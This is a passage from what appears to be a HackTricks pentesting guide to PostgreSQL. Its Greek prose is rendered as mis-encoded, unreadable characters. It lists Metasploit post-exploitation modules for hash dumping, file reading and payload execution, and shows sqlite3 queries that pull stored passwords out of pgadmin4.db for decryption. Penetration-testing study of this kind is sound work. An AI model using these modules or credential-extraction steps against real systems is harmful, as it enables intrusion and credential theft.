8. Î¤ÏÏÎ± Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÎµÎ½ÏŒÏ‚ Ï€Î»Î®ÏÎ¿Ï…Ï‚ superadmin.

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logging

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿ _**postgresql.conf**_ Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î± logs Ï„Î¿Ï… postgresql Î±Î»Î»Î¬Î¶Î¿Î½Ï„Î±Ï‚:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Î¤ÏŒÏ„Îµ, **ÎµÏ€Î±Î½ÎµÎºÎºÎ¹Î½Î®ÏƒÏ„Îµ Ï„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±**.

### pgadmin

[pgadmin](https://www.pgadmin.org) ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± Î´Î¹Î±Ï‡ÎµÎ¯ÏÎ¹ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î±Î½Î¬Ï€Ï„Ï…Î¾Î·Ï‚ Î³Î¹Î± Ï„Î¿ PostgreSQL.\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ **ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ _**pgadmin4.db**_ Î±ÏÏ‡ÎµÎ¯Î¿\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿Ï…Ï‚ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÏ„Îµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· _**decrypt**_ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

Î— Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï€ÎµÎ»Î¬Ï„Î· ÏƒÏ„Î¿ PostgreSQL Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚ Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **pg\_hba.conf**. Î‘Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¼Î¹Î± ÏƒÎµÎ¹ÏÎ¬ Î±Ï€ÏŒ ÎµÎ³Î³ÏÎ±Ï†Î­Ï‚, ÎºÎ¬Î¸Îµ Î¼Î¯Î± Î±Ï€ÏŒ Ï„Î¹Ï‚ Î¿Ï€Î¿Î¯ÎµÏ‚ ÎºÎ±Î¸Î¿ÏÎ¯Î¶ÎµÎ¹ Î­Î½Î±Î½ Ï„ÏÏ€Î¿ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚, ÎµÏÏÎ¿Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÏ‰Î½ IP Ï€ÎµÎ»Î¬Ï„Î· (Î±Î½ Î¹ÏƒÏ‡ÏÎµÎ¹), ÏŒÎ½Î¿Î¼Î± Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· ÎºÎ±Î¹ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ Î±Î½Ï„Î¹ÏƒÏ„Î¿Î¯Ï‡Î¹ÏƒÎ· Ï„Ï‰Î½ ÏƒÏ…Î½Î´Î­ÏƒÎµÏ‰Î½. Î— Ï€ÏÏÏ„Î· ÎµÎ³Î³ÏÎ±Ï†Î® Ï€Î¿Ï… Ï„Î±Î¹ÏÎ¹Î¬Î¶ÎµÎ¹ Î¼Îµ Ï„Î¿Î½ Ï„ÏÏ€Î¿ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚, Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï€ÎµÎ»Î¬Ï„Î·, Ï„Î· Î¶Î·Ï„Î¿ÏÎ¼ÎµÎ½Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎºÎ±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·. Î”ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎµÎ½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ® Î® Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î¿ Î±Î½ Î· Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹. Î‘Î½ ÎºÎ±Î¼Î¯Î± ÎµÎ³Î³ÏÎ±Ï†Î® Î´ÎµÎ½ Ï„Î±Î¹ÏÎ¹Î¬Î¶ÎµÎ¹, Î· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î±Ï€Î¿ÏÏÎ¯Ï€Ï„ÎµÏ„Î±Î¹.

ÎŸÎ¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼ÎµÏ‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Î¹ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ ÏƒÏ„Î¿ pg\_hba.conf ÎµÎ¯Î½Î±Î¹ **md5**, **crypt** ÎºÎ±Î¹ **password**. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Î¼Î­Î¸Î¿Î´Î¿Î¹ Î´Î¹Î±Ï†Î­ÏÎ¿Ï…Î½ ÏƒÏ„Î¿Î½ Ï„ÏÏŒÏ€Î¿ Î¼ÎµÏ„Î¬Î´Î¿ÏƒÎ·Ï‚ Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚: MD5-hashed, crypt-encrypted Î® clear-text. Î•Î¯Î½Î±Î¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ Î½Î± ÏƒÎ·Î¼ÎµÎ¹Ï‰Î¸ÎµÎ¯ ÏŒÏ„Î¹ Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ crypt Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¼Îµ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¸ÎµÎ¯ ÏƒÏ„Î¿ pg\_authid.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}
